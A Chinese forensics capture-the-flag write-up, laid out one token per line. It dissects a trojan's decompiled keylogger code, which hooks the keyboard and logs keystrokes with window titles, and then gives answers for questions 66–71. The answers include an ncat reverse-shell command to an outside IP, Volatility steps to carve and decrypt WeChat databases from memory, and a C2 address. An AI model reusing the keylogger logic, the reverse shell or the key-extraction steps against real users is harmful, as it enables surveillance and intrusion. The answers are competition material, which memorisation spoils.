+它安装的是低级键盘钩子
+private
+static
+LowLevelKeyboardProc
+s87uDCuNDkFL2iQ0tcXL
+=
+new
+LowLevelKeyboardProc
+(
+daoOLgSXwcVRT6eMUelpfKxTQtS4yJiu9HT7Xp8Tcrjf4safq1GbcYEeKZRWp65AXcVQofJiDpi62
+)
+;
+private
+static
+int
+qngu7xoZGGhpg5AVMmig
+=
+13
+;
+private
+delegate
+IntPtr
+LowLevelKeyboardProc
+(
+int
+nCode
+,
+IntPtr
+wParam
+,
+IntPtr
+lParam
+)
+;
+这里有两个关键点：
+1. 回调类型名直接就是 `LowLevelKeyboardProc`
+2. `qngu7xoZGGhpg5AVMmig = 13`
+在 Windows 中，
+SetWindowsHookEx
+的第一个参数
+idHook=13
+对应：
+WH_KEYBOARD_LL
+也就是
+低级键盘钩子
+。因此可以确定它不是鼠标钩子，也不是普通窗口消息钩子，而是专门拦截键盘输入
+回调函数确实在处理按键
+private
+static
+IntPtr
+daoOLgSXwcVRT6eMUelpfKxTQtS4yJiu9HT7Xp8Tcrjf4safq1GbcYEeKZRWp65AXcVQofJiDpi62
+(
+int
+nCode
+,
+IntPtr
+wParam
+,
+IntPtr
+lParam
+)
+{
+if
+(
+nCode
+>=
+0
+&&
+wParam
+==
+(
+IntPtr
+)
+256
+)
+{
+object
+value
+=
+Marshal
+.
+ReadInt32
+(
+lParam
+)
+;
+object
+obj
+=
+(
+(
+int
+)
+OpbwP6NsWf5nxMJWTRXq
+(
+20
+)
+&
+65535
+)
+!=
+0
+;
+object
+value2
+=
+(
+(
+int
+)
+OpbwP6NsWf5nxMJWTRXq
+(
+160
+)
+&
+32768
+)
+!=
+0
+||
+(
+(
+int
+)
+OpbwP6NsWf5nxMJWTRXq
+(
+161
+)
+&
+32768
+)
+!=
+0
+;
+object
+obj2
+=
+ZdpW1HIX5h8dEVrxUI7Pgw0w1PTBnwQp5qq61KsrVq3YdVSHXnOUj1dovehQBzapPsmpH97xkg1M8
+(
+Conversions
+.
+ToUInteger
+(
+value
+)
+)
+;
+..
+.
+}
+return
+B4qKxfck2L7xA8QlrpiC
+(
+T5ohLdZOIkU5OcJb1OhB
+,
+nCode
+,
+wParam
+,
+lParam
+)
+;
+}
+这里的：
+wParam == (IntPtr)256
+对应的是
+WM_KEYDOWN
+也就是说，
+只有在按键按下时
+，这个回调才会去处理输入。随后它：
+Marshal.ReadInt32(lParam)
+读出按键值
+GetKeyState
+判断大小写、Shift、CapsLock 等状态
+调用
+ZdpW1HIX...()
+把虚拟键转换为实际字符
+最后再把事件继续交给
+CallNextHookEx
+这已经不是“有 Hook 能力”，而是
+真的在拦截并解析键盘输入
+它会把按键写入日志文件
+using
+(
+StreamWriter
+streamWriter
+=
+new
+StreamWriter
+(
+NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq
+.
+djSjX4g3ZiY9oWtEDqE4AIPXzEgqM2a7otI0xazKObKOkclG4XXQIEuFFvZi
+,
+true
+)
+)
+{
+if
+(
+object
+.
+Equals
+(
+wZqH9qZi1oLwR3nWYK7O
+,
+KWRBzyFPpR8ffdzvL9wCltsiOR0s2zmpaJtrqgtlMUil2AJPiujX3G2CIiOOHRQdYTWkN26lZ3Alt
+(
+)
+)
+)
+{
+streamWriter
+.
+Write
+(
+RuntimeHelpers
+.
+GetObjectValue
+(
+obj2
+)
+)
+;
+}
+else
+{
+streamWriter
+.
+WriteLine
+(
+Environment
+.
+NewLine
+)
+;
+streamWriter
+.
+WriteLine
+(
+"###  "
++
+KWRBzyFPpR8ffdzvL9wCltsiOR0s2zmpaJtrqgtlMUil2AJPiujX3G2CIiOOHRQdYTWkN26lZ3Alt
+(
+)
++
+" ###"
+)
+;
+streamWriter
+.
+Write
+(
+RuntimeHelpers
+.
+GetObjectValue
+(
+obj2
+)
+)
+;
+}
+}
+解析后的按键字符
+obj2
+会被写入
+djSjX4g3...
+指向的日志文件
+如果当前前台窗口变化了，还会额外写入：
+### 窗口标题 ###
+也就是说，木马不仅记录按键，还会记录“用户是在
+哪个窗口
+里输入的”
+它用前台窗口标题补全上下文
+private
+static
+string
+KWRBzyFPpR8ffdzvL9wCltsiOR0s2zmpaJtrqgtlMUil2AJPiujX3G2CIiOOHRQdYTWkN26lZ3Alt
+(
+)
+{
+IntPtr
+hwnd
+=
+C6Sh5CvopUYbbvzDkWZs
+(
+)
+;
+LkOj3CGUJtRW28i6mzGW
+(
+hwnd
+,
+out
+num
+)
+;
+object
+processById
+=
+Process
+.
+GetProcessById
+(
+(
+int
+)
+num
+)
+;
+object
+objectValue
+=
+processById
+.
+MainWindowTitle
+;
+if
+(
+string
+.
+IsNullOrWhiteSpace
+(
+Conversions
+.
+ToString
+(
+objectValue
+)
+)
+)
+{
+objectValue
+=
+processById
+.
+ProcessName
+;
+}
+wZqH9qZi1oLwR3nWYK7O
+=
+Conversions
+.
+ToString
+(
+objectValue
+)
+;
+return
+Conversions
+.
+ToString
+(
+objectValue
+)
+;
+}
+这里调用：
+GetForegroundWindow
+GetWindowThreadProcessId
+Process.GetProcessById(...).MainWindowTitle
+说明样本会取当前活动窗口标题，再和按键日志一起写入，从而形成完整的键盘记录上下文
+结论
+样本通过
+SetWindowsHookEx
+安装全局低级键盘钩子来捕获用户输入
+证据链
+DllImport("user32.dll", EntryPoint="SetWindowsHookEx")
+明确导入了 Hook API。
+gbCd08r...()
+实际调用该 API，并将返回的句柄保存后进入
+Application.Run()
+，说明 Hook 被真实安装并保持常驻。
+调用参数中
+idHook=13
+，结合
+LowLevelKeyboardProc
+回调，说明这是
+WH_KEYBOARD_LL
+低级键盘钩子。
+回调函数仅在
+wParam == 256 (WM_KEYDOWN)
+时触发，随后读取按键码并通过
+GetKeyState
+、
+GetKeyboardState
+、
+ToUnicodeEx
+等 API 转换成真实字符。
+最终按键内容被写入日志文件，同时附带前台窗口标题，形成完整的键盘记录行为。
+**答案： SetWindowsHookEx **
+66.请分析倩倩的PC镜像，倩倩的电脑曾被api投毒过，请找出投毒后执行的的恶意命令。【答案格式：cmd.exe 172.0.0.1 22 -i hello】
+ncat.exe 156.238.239.253 1314 -e powershell
+67.请分析倩倩的PC内存镜像，识别当前正在运行且持有微信数据库解密密钥的微信进程，并提取该进程的进程标识符（PID）？【答案格式：1234】
+也是氪上金了
+https://github.com/Tokeii0/LovelyMem
+答案：10892
+10892 = Weixin.exe
+，而且是最早启动的那个主进程
+它下面派生了大量
+WeChatAppEx.exe / Weixin.exe
+子进程
+Threads=115
+，明显比其他几个微信相关进程更像主进程
+68.请分析倩倩的PC内存镜像，请尝试解密微信数据库并写出message_0.db对应的微信密钥?【答案格式：60e248c9079f4bc14e256e0b65495e8688d7b342d43dc84a5f417f4097c9c792】
+message_0.db      0x900a6ae88140
+message_0.db      0x900a5bb46970
+message_0.db-wal  0x900a6ae72ca0
+message_0.db-shm  0x900a6ae73920
+下一步直接跑这 4 条：
+&
+"H:\Forensics\Lovelymem_20260312\Tools\python3\python.exe"
+.
+\vol
+.
+py
+-
+f
+"H:\26\DESKTOP-3943OKD-20260403-014746.dmp"
+-
+o
+".\dump_out"
+windows
+.
+dumpfiles
+--
+virtaddr 0x900a6ae88140
+
+&
+"H:\Forensics\Lovelymem_20260312\Tools\python3\python.exe"
+.
+\vol
+.
+py
+-
+f
+"H:\26\DESKTOP-3943OKD-20260403-014746.dmp"
+-
+o
+".\dump_out"
+windows
+.
+dumpfiles
+--
+virtaddr 0x900a5bb46970
+
+&
+"H:\Forensics\Lovelymem_20260312\Tools\python3\python.exe"
+.
+\vol
+.
+py
+-
+f
+"H:\26\DESKTOP-3943OKD-20260403-014746.dmp"
+-
+o
+".\dump_out"
+windows
+.
+dumpfiles
+--
+virtaddr 0x900a6ae72ca0
+
+&
+"H:\Forensics\Lovelymem_20260312\Tools\python3\python.exe"
+.
+\vol
+.
+py
+-
+f
+"H:\26\DESKTOP-3943OKD-20260403-014746.dmp"
+-
+o
+".\dump_out"
+windows
+.
+dumpfiles
+--
+virtaddr 0x900a6ae73920
+在message附近的找
+b0fb4730d908c07d3e928b5c418a7470bd954d100c9607821e0c05051c4588aa，成功解密db
+火眼小工具直接秒了
+69.请分析倩倩的PC内存镜像，请找到正在运行的木马进程的进程标识符（PID）。【答案格式：1233】
+6736
+70.请分析倩倩的PC内存镜像，请找到正在运行的木马进程的创建时间（UTC）?【答案格式：2026-01-01 01:11:11】
+2026-04-03 01:46:44
+71.请分析倩倩的PC内存镜像，结合木马分析找出内存中回连的C2木马服务器的真实ip?【答案格式：127.0.0.1:8080】
+59,60有提到，所以是156.238.239.253:7000
